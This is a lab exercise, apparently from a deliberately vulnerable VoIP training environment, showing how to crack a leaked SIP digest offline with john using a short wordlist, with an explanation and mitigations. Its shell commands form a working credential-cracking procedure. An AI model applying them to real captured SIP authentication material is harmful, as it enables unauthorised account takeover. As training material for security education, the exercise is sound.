# Exercise 5: Offline SIP Credential Cracking

## Goal

Take the SIP digest material captured from the `pbx2` digest-leak path and crack it offline with `john`.

## Prerequisites

- DVRTC running: `./scripts/compose.sh --scenario pbx2 up -d`
- Exercise 4 completed, with output saved under `/work/pbx2-digestleak.txt`
- The `attacker` service available for offline cracking tools

## Steps

### Step 1: Open an interactive attacker shell

Run on the host:

```bash
./scripts/compose.sh --scenario pbx2 run --rm attacker sh
```

### Step 2: Save the leaked SIP hash

In the attacker shell:

```bash
grep '^\$sip\$' /work/pbx2-digestleak.txt | tail -n 1 > /work/pbx2-sip.hash
```

### Step 3: Create a short wordlist

In the attacker shell:

```bash
printf '%s\n' 2000 1500 1234 password admin > /work/pbx2-wordlist.txt
```

### Step 4: Crack the digest

In the attacker shell:

```bash
john --format=SIP --wordlist=/work/pbx2-wordlist.txt /work/pbx2-sip.hash
john --show --format=SIP /work/pbx2-sip.hash
exit
```

Look for `2000` in the crack output, then `1 password hash cracked` from `john --show`.

## What's happening

SIP digest authentication never sends the cleartext password. The server issues a challenge, and the client returns a hash computed from the password, the challenge, and a few fixed fields. An attacker who captures a matching challenge-response pair can test candidate passwords locally by redoing the same computation until one matches.

That makes the attack fully offline: the target does not need to be reachable, no failed attempts show up on the server, and guessing speed is bounded only by local CPU. In `pbx2`, the leaked digest belongs to extension `2000`, which uses a deliberately weak password that a short wordlist recovers quickly.

## Mitigation

- Prevent the digest leak that produces the offline cracking material
- Use strong passwords that are not guessable from short wordlists
- Prefer stronger authentication designs where possible
- Limit who can observe or export SIP authentication material
